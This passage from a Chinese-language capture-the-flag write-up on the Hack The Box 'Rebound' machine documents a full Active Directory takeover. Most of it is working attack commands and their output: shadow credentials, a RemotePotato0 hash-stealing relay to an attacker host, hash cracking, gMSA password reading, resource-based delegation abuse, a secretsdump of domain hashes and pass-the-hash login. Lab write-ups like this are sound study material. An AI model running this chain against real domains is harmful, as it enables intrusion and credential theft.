LDAP        10.10.11.231    389    DC01             [-] rebound.htb\llune:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\fflock:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [+] rebound.htb\jjones account vulnerable to asreproast attack
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\ldap_monitor
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\oorend
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
LDAP        10.10.11.231    389    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u KDC_ERR_PREAUTH_FAILED
```

还真找到了，一个新用户`oorend`，验证一下

还需要申请票据

```shell
impacket-getTGT 'rebound.htb'/'oorend':'1GR8t@$$4u' -dc-ip 10.10.11.231
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in oorend.ccache
```

导入票据

```shell
export KRB5CCNAME=oorend.ccache
```

验证

```shell
nxc ldap 10.10.11.231 -u 'oorend' -p '1GR8t@$$4u' -k
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\oorend
```

没问题，试了一下`winrm`，但是失败了

# 攻击面分析

有了`oorend`，就可以研究攻击路线了

![image-20250326170429125](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250326170430332-946389261.png)

大概就这个路线，详细分析一下

1. 由于`oorend`用户对`ServiceMgmt`组有`AddSelf`权限，所以我们可以把自己加入到其组中
2. 而`ServiceMgmt`组在`Service Users`组织单元(OU)上具有`GenericAll`权限，所以我们可以将权限授予给`Service Users`内的所有成员，结果就是`oorend`用户对`winrm_svc`用户具有`GenericAll`权限
3. 通过`winrm_svc`用户登录

# 拿下winrm_svc！

> 参考链接：https://www.thehacker.recipes/ad/movement/dacl/

先同步时间

```shell
ntpdate -s rebound.htb
```

先把`oorend`用户添加到`ServiceMgmt`组

```shell
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorend
[+] oorend added to ServiceMGMT
```

现在`oorend`用户已经加入到`ServiceMgmt`组了，现在对服务用户`OU`有`GenericAll`权限，我们就可以将这个权限扩展到`OU`内的所有对象，所以我们可以扩展到`winrm_svc`用户

```shell
bloodyAD -u oorend -p '1GR8t@$$4u' -d rebound.htb --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

现在我们对`winrm_svc`用户就有`GenericAll`权限了，直接`Shadow Credentials` 攻击

```shell
certipy-ad shadow auto -u oorend@rebound.htb -p '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f9ad8249-f723-4d16-7580-eb59daf80d2f'
[*] Adding Key Credential with device ID 'f9ad8249-f723-4d16-7580-eb59daf80d2f' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'f9ad8249-f723-4d16-7580-eb59daf80d2f' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': e392b1774e35f731ba0650f6fc812a99
```

**注：上面的操作需要在短时间内完成，不然会恢复初始状态**

拿到hash，验证一下

```shell
nxc winrm 10.10.11.231 -u winrm_svc -H e392b1774e35f731ba0650f6fc812a99
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [+] rebound.htb\winrm_svc:e392b1774e35f731ba0650f6fc812a99 (Pwn3d!)
```

拿`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.231 -u winrm_svc -H 4469650fd892e98933b4536d2e86e512

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
rebound\winrm_svc
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

在`Desktop`找到`user.txt`

# 后信息收集

先看看能不能利用ADCS服务提权

```shell
certipy-ad find -k -u 'winrm_svc' -hashes e392b1774e35f731ba0650f6fc812a99 -target dc01.rebound.htb -dc-ip 10.10.11.231 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'rebound-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'rebound-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'rebound-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'rebound-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : rebound-DC01-CA
    DNS Name                            : dc01.rebound.htb
    Certificate Subject                 : CN=rebound-DC01-CA, DC=rebound, DC=htb
    Certificate Serial Number           : 42467DADE6281F8846DC3B6CEE24740D
    Certificate Validity Start          : 2023-04-08 13:55:49+00:00
    Certificate Validity End            : 2122-04-08 14:05:49+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : REBOUND.HTB\Administrators
      Access Rights
        ManageCertificates              : REBOUND.HTB\Administrators
                                          REBOUND.HTB\Domain Admins
                                          REBOUND.HTB\Enterprise Admins
        ManageCa                        : REBOUND.HTB\Administrators
                                          REBOUND.HTB\Domain Admins
                                          REBOUND.HTB\Enterprise Admins
        Enroll                          : REBOUND.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

有ADCS服务，但是没找到可利用的点，去翻翻机器

```shell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/28/2023   8:23 PM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----        8/22/2023  12:05 PM                tbrady
d-----         4/8/2023   2:08 AM                winrm_svc
```

发现还有个`tbrady`用户，回到`bloodhound`再看看

点击`First Degree Object Control`

![img](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250327171250329-1291488053.png)

发现当前用户可以读取`DELEGATOR$`机器账户的`gMSA`密码，	但还是不能拿到`tbrady`用户的凭据

可以确定的是我们的目标就是这个用户

# RemotePotato0跨会话中继

最终发现了一个名为 [RemotePotato0](https://github.com/antonioCoco/RemotePotato0) 的漏洞，它可以利用跨会话中继，设置本地监听器并强制特权 `DCOM` 激活服务到它，从而触发**当前在目标计算机中登录的任何用户的** `NTLM` 身份验证。我们可以在 `tbrady` 登录机器时获得他的 `NTLMv2` 哈希值！

> 它滥用 DCOM 激活服务，并触发当前在目标计算机中登录的任何用户的 NTLM 身份验证。要求特权用户（例如域管理员用户）登录同一台计算机。触发 NTLM type1 后，我们设置一个跨协议中继服务器，该服务器接收特权 type1 消息，并通过解压缩 RPC 协议并通过 HTTP 打包身份验证将其中继到第三个资源。在接收端，您可以设置另一个中继节点（例如 ntlmrelayx）或直接中继到特权资源。RemotePotato0 还允许抓取和窃取登录机器上的每个用户的 NTLMv2 哈希值。

所以可以抓到其他登录用户的hash，我们在本地设置一个 `socat` 中继，将 RPC 调用发送到我们的攻击机器，并将其中继回 `RPC` 服务器并捕获登录到机器的其他用户的 `NTLMv2` 哈希值 。

将工具传到机器上

```shell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> upload RemotePotato0.exe

Info: Uploading /root/HackTheBox/Rebound/RemotePotato0.exe to C:\Users\winrm_svc\Documents\RemotePotato0.exe

Data: 235520 bytes of 235520 bytes copied

Info: Upload successful!
```

在本地设置一个`socat` 中继

```shell
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999
```

在目标机器上运行

```shell
./RemotePotato0.exe -m 2 -x 10.10.16.4 -p 9999 -s 1
```

选择以会话 `1` 为目标是因为会话 `0` 是为服务和非交互式用户应用程序保留的（我们在 `WinRM` 期间所处的位置）。以本机方式登录到 Windows 的用户必须在会话 `1` 或更高版本中运行

不一会就捕获到`tbrady`用户的`hash`了

```shell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./RemotePotato0.exe -m 2 -x 10.10.16.4 -p 9999 -s 1
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 102 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:e97a1b39652728fb:e7de7b31c46c060ba15e4c197019b6d6:01010000000000002015b825b5a7db01bd4ef92613923e4b0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008002015b825b5a7db0106000400060000000800300030000000000000000100000000200000983f8d22b56135b0497c1eb14cb9d8533a1bba4769ea4e3c611067cab032f0c50a00100000000000000000000000000000000000090000000000000000000000
```

将结果保存至`ntlm_hash`文件中，使用`john`破解一下

```shell
john ntlm_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
543BOMBOMBUNmanda (tbrady)
1g 0:00:00:17 DONE (2025-04-07 20:00) 0.05668g/s 691025p/s 691025c/s 691025C/s 5442657..5435844
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

成功！拿到用户名密码

```info
username: tbrady
password: 543BOMBOMBUNmanda
```

验证一下

```shell
nxc ldap 10.10.11.231 -u tbrady -p 543BOMBOMBUNmanda
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [-] rebound.htb\tbrady:543BOMBOMBUNmanda
LDAPS       10.10.11.231    636    DC01             [-] LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.
```

还是要票据

先同步时间，在请求票据

```shell
ntpdate -s rebound.htb

impacket-getTGT 'rebound.htb'/'tbrady':'543BOMBOMBUNmanda' -dc-ip 10.10.11.231

export KRB5CCNAME=tbrady.ccache
```

再次验证

```shell
nxc ldap 10.10.11.231 -u tbrady -p 543BOMBOMBUNmanda -k
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\tbrady
```

没问题！

# ReadGMSAPassword

> 参考链接：https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword

我们得到`tbrady`用户的凭据就可以读取`DELEGATOR$`机器账户的的`gMSA`密码，这里使用`nxc`

```shell
nxc ldap 10.10.11.231 -u tbrady -p 543BOMBOMBUNmanda -k --gmsa
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda
LDAPS       10.10.11.231    636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.231    636    DC01             Account: delegator$           NTLM: d0700a7a8e202cbad887ebf92e4d1080
```

又拿到了`delegator$`账户的hash，继续横向

先同步时间，在请求票据

```shell
ntpdate -s rebound.htb

impacket-getTGT 'rebound.htb'/'delegator$' -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231

export KRB5CCNAME=delegator$.ccache
```

验证

```shell
nxc ldap 10.10.11.231 -u 'delegator$' -H d0700a7a8e202cbad887ebf92e4d1080 -k
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.231    636    DC01             [+] rebound.htb\delegator$

nxc winrm 10.10.11.231 -u 'delegator$' -H d0700a7a8e202cbad887ebf92e4d1080
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\delegator$:d0700a7a8e202cbad887ebf92e4d1080
```

但还是无法登录

# 再次信息收集

目前为止，这已经是我们能够利用已知条件可以攻击到最深入的地方了，要想继续深入，还需要进一步对`delegator$`信息收集

 ![image-20250407162420947](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250407162430706-1802444970.png)

发现一些委托的信息，具有 `browser/dc01.rebound.htb` 的 SPN，允许为 dc01 计算机对象委派 HTTP

使用`impacket-findDelegation`验证一下

```shell
ntpdate -s rebound.htb

impacket-findDelegation 'rebound.htb'/'delegator$' -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231 -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists
-----------  -----------------------------------  --------------  ---------------------  ----------
delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
```

虽然没有导入票据，但是想要的已经出来了

可以看到存在对 `http/dc01.rebound.htb` 的约束委托。这实质上意味着 `delegator$` 可以为 `dc01$` 上运行的 `http` 服务的任何用户（域管理员）请求 `TGS`。

# 约束委派 ×

> 参考链接：https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained

使用 `delegator$` 计算机帐户，可以利用约束委派 （KCD），约束委派的通常利用是使用 `HTTP` 服务的 `impacket-getST` 获取服务票证 （`TGS`），同时模拟任何用户（用于权限提升的域管理员）。

但由于是约束性委派，只能通过`S4U2Self`协议生成不可转发的`TGT`，想通过`S4U2Proxy`协议时就无法通过

```shell
impacket-getST -dc-ip rebound.htb -spn http/dc01.rebound.htb -hashes :d0700a7a8e202cbad887ebf92e4d1080 -impersonate administrator rebound.htb/delegator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user delegator or initial TGT not forwardable
```

排查下原因

![image-20250407164417615](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250407164425121-1432461749.png)

发现`Administrator`有限制，但是，有一种技术允许使用 `RBCD`（基于资源的约束委派）绕过此限制

# 基于资源的约束委派 √

> 参考链接：
>
> https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
>
> https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/

我们可以使用 `RBCD`来滥用， 这种形式的委托允许服务委托对特定资源的访问权限，而不是委托对一整套权限的访问权限。

来分析一下攻击思路：

> 先为 `delegator$` 申请一个有效的 `TGT`
>
> 再设置`delegator$`用户的`AllowedToActOnBehalfOfOtherIdentity`属性，用于控制前端服务可以在基于资源的约束委派中委托给后端`delegator$` 的内容（计算机帐户有权设置自己的属性）在后端服务上设置 `ms-Ds-AllowedToActOnBehalfOfOtherIdentity` 属性时，前端服务必须在域中设置 `SPN`，所以我们该如何设置允许服务 （`SPN`） 委托给 `delegator$` 呢？要不人为的添加一个，要不使用一个已经被我们可控制的。

> 我们无法添加计算机帐户（默认情况下具有 SPN），但是我们在最开始已经控制了`ldap_monitor`这个服务用户，就可以利用这个服务用户使用 `S4U2Self`（代表其他用户获取 `TGS`）通过 `S4U2Proxy` 在 `delegator$` 上请求可转发的 `TGS`（代表其他用户在第二服务上获取 `TGS`）。

先请求`TGT`并导入环境变量中

```shell
ntpdate -s rebound.htb

impacket-getTGT 'rebound.htb'/'delegator$' -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231

export KRB5CCNAME=delegator$.ccache
```

然后使用`rbcd`工具，改变`delegator$`用户的`AllowedToActOnBehalfOfOtherIdentity`属性，并再次使用`impacket-findDelegation`验证

```shell
impacket-rbcd -k -no-pass 'rebound.htb'/'delegator$' -delegate-to 'delegator$' -delegate-from 'ldap_monitor' -dc-ip rebound.htb -action 'write'  -use-ldaps
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)

impacket-findDelegation 'rebound.htb'/'delegator$' -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231 -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting machine hostname
AccountName   AccountType                          DelegationType              DelegationRightsTo     SPN Exists
------------  -----------------------------------  --------------------------  ---------------------  ----------
ldap_monitor  Person                               Resource-Based Constrained  delegator$             No
delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb  No
```

现在 `ldap_monitor` 可以通过 `S4U2Proxy` 模拟 `delegator$` 上的任何用户

接下来，我们请求`TGT`，接着请求 `ldap_monitor` 帐户的自服务票据，尝试使用该帐户模拟 `dc01$` 计算机帐户

为什么不使用管理员账户呢？因为之前分析发现管理员账户无法被委派

```shell
impacket-getTGT 'rebound.htb/ldap_monitor:1GR8t@$$4u' -dc-ip 10.10.11.231
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ldap_monitor.ccache

export KRB5CCNAME=ldap_monitor.ccache 

impacket-getST -spn 'browser/dc01.rebound.htb' -impersonate 'dc01$' 'rebound.htb/ldap_monitor' -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```

申请自服务票据成功！接下来进行第二阶段的攻击

```shell
export KRB5CCNAME=dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache

impacket-getST -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache" "rebound.htb/delegator$" -hashes :d0700a7a8e202cbad887ebf92e4d1080 -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating dc01$
[*]     Using additional ticket dc01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

获得`dc01`机器账户的票据，由于这是机器账户的票据所以我们可以直接转储

```shell
export KRB5CCNAME=dc01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache

impacket-secretsdump dc01.rebound.htb -k -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up...
```

拿到了管理员的`hash`！

**PS: 上面的两个spn不一定非得用这俩，也可以用CIFS或者ldap，我只是根据现有的来使用的，同样用ldap_monitor的原因是这个是目前有凭据的服务账户**

# PTH登录

使用`evil-winrm`直接登录

```shell
evil-winrm -i 10.10.11.231 -u Administrator -H 176be138594933bb67db3b2572fc91b8

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
rebound\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

登陆成功！在`Desktop`找到`root.txt`，收工！